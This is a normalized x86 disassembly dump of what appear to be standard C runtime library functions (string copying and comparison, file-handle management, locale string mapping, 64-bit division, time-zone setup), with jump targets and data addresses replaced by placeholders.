and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_40ba20
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_40ba30
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_40bb10
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40bb94
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_40bc30
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_408afc
pop esi
retn 0x4
sub_40bc5f
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_40bc7a
push ebx
push esi
push edi
or ebx 0xffffffff
xor edi edi
xor esi esi
mov ecx rw-data
mov esi 0x100
push esi
call sub_408ba8
test eax eax
pop ecx
je r-xdata
lea edx [ eax + 0x100 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
add [ rw-data ] 0x20
lea ecx [ edi * 4 + rw-data ]
lea edx [ eax + 0x100 ]
mov [ ecx ] eax
add ecx 0x4
inc edi
add esi 0x20
cmp ecx rw-data
jl r-xdata
test [ eax + 0x4 ] 0x1
je r-xdata
shl edi 0x5
mov ebx edi
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x8
add edx esi
jmp r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
jmp r-xdata
or [ eax ] 0xffffffff
sub eax [ ecx ]
sar eax 0x3
add eax esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
add eax 0x8
jmp r-xdata
cmp eax edx
jae r-xdata
cmp eax edx
jae r-xdata
sub_40bd0f
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
cmp [ ecx + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40bd86
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_40be00
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je r-xdata
mov eax [ eax ]
retn
sub_40be3d
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je r-xdata
push eax
call sub_40be00
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
retn
mov [ rw-data ] eax
test eax eax
je r-xdata
sub_40be94
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je r-xdata
push eax
call sub_40be00
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp r-xdata
push eax
call sub_4094fc
pop ecx
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_40bf2e
inc [ rw-data ]
push 0x1000
call sub_408ba8
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_40bf98
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
je r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ rw-data ] 0x16
mov [ rw-data ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
or eax 0xffffffff
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
jmp r-xdata
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_40bc7a
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x18
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4094fc
pop ecx
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov eax edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_40bd0f
pop ecx
mov al [ ebp - 0x1 ]
pop ecx
mov esi ebx
mov ecx ebx
or al 0x1
sar ecx 0x5
and esi 0x1f
mov [ ebp + 0xb ] al
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
and [ ebp + 0xb ] 0x48
mov [ ecx + esi + 0x4 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_40be94
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_40d1ba
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_40be94
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
jmp r-xdata
push ebx
call sub_408e67
pop ecx
push [ ebp - 0x10 ]
push ebx
call sub_40d074
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_40c251
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_40d410
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_40d3b0
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_40c39a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40c5be
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_40d410
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_40d410
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40c5be
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40c5f0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_40c6ee
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
mov [ rw-data ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_40c760
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40c7d0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40c85a
push ecx
push ebx
push ebp
push esi
push edi
xor ebp ebp
or ebx 0xffffffff
push r--data
xor edi edi
mov [ rw-data ] ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_40d448
mov esi eax
pop ecx
cmp esi ebp
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bp
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_407d6e
push esi
call sub_407ea0
inc eax
push eax
call sub_408ba8
add esp 0xc
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_40bb10
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bp
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_40ba20
push 0x3
push esi
push [ rw-data ]
call sub_40c5f0
mov eax [ rw-data ]
add esi 0x3
add esp 0x14
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push esi
call sub_407838
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
push 0x1
inc esi
pop edi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ esp + 0x10 ] ebp
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ esp + 0x10 ] ebp
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ esp + 0x10 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebp
push 0x3f
mov edi 0x220
push [ rw-data ]
push ebx
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebp
push 0x3f
push [ rw-data ]
push ebx
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp edi ebp
je r-xdata
inc esi
push esi
call sub_407838
imul eax eax 0x3c
